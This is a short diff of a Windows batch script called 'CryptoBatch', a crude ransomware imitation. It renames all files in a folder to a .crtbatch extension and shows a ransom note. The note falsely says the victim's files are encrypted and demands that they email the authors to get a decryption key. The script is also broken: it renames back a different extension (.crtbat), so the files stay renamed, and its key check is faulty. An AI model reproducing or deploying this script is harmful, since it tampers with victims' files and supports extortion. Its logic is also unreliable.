@@ -2,11 +2,10 @@
 color 02
 title CryptoBatch
 ren *.* *.crtbatch
-rename 
 echo ATTENTION!
 echo -------------------------------------------------------------------------------------------------------------
 echo All your files like photos, databases, documents and other important are encrypted!        
-echo Don’t worry, you can return all your files!
+echo Donâ€™t worry, you can return all your files!
 echo The only method of recovering files is to get an unique key for you.
 echo To get the key you need write on our e-mail and send with your ID:
 echo Our E-mail:
@@ -18,7 +17,7 @@ pause
 echo Type your decrypt key:
 set /p key=asd3SGd8723bqD7SH8JmYm298WxkjhasiuSDFS35Je5RhszHsdsals6
 if %key%==key (
-rename *.crtbat *.*
+ren *.crtbat *.*
 echo Your files are decrypted!
 pause 
 exit
